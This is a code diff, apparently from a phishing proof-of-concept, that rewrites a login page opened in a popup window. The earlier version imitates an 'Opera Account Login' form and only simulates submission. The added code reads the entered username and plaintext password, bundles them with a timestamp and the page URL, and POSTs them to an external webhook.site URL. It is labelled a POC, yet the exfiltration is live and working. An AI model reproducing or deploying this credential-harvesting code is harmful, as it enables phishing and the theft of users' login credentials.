@@ -39,85 +39,112 @@ win.document.open();
 
 win.document.write(`
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>Login Test</title>
+  <meta charset="UTF-8">
+  <title>Login Webhook Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
 
-<style>
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      width: 350px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      text-align: center;
+    }
 
-body{
-font-family:Arial;
-background:#f2f2f2;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-margin:0;
-}
+    .login-box h2 {
+      margin-bottom: 25px;
+      color: #333;
+    }
 
-.box{
-background:white;
-padding:40px;
-width:320px;
-box-shadow:0 0 10px rgba(0,0,0,0.2);
-text-align:center;
-}
+    .login-box input {
+      width: 100%;
+      padding: 12px 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
 
-input{
-width:100%;
-padding:10px;
-margin-top:10px;
-}
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #e60023;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s;
+    }
 
-button{
-margin-top:15px;
-width:100%;
-padding:10px;
-background:#e60023;
-color:white;
-border:none;
-cursor:pointer;
-}
+    .login-box button:hover {
+      background-color: #b3001a;
+    }
 
-</style>
-
+    #status {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="box">
+<div class="login-box">
+  <h2>Login (Webhook POC)</h2>
 
-<h3>Opera Account Login</h3>
+  <input id="username" placeholder="Username" type="text">
+  <input id="password" placeholder="Password" type="password">
+  <button onclick="send()">LOGIN & KIRIM</button>
 
-<input id="username" placeholder="username">
-
-<input id="password" type="password" placeholder="password">
-
-<button onclick="simulateLogin()">Sign In</button>
-
-<p id="status"></p>
-
+  <p id="status"></p>
 </div>
 
 <script>
+  const WEBHOOK_URL = "https://webhook.site/c697fd9f-ed36-4444-abb1-bc44fcb0a716";
 
-function simulateLogin(){
+  function send() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
 
-var username = document.getElementById("username").value;
-var password = document.getElementById("password").value;
+    if (!username || !password) {
+      alert("Username dan password wajib diisi!");
+      return;
+    }
 
-if(!username || !password){
-alert("Username dan password wajib diisi");
-return;
-}
+    const data = {
+      username: username,
+      password: password,   // ⚠️ POC ONLY
+      action: "login",
+      time: new Date().toISOString(),
+      page: window.location.href
+    };
 
-document.getElementById("status").innerText =
-"Login submitted (simulation for PoC).";
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify(data)
+    });
 
-}
-
-<\/script>
+    document.getElementById("status").innerText = "DONT SUBMIT REAL";
+    
+    // Reset input setelah dikirim
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  }
+</script>
 
 </body>
 </html>
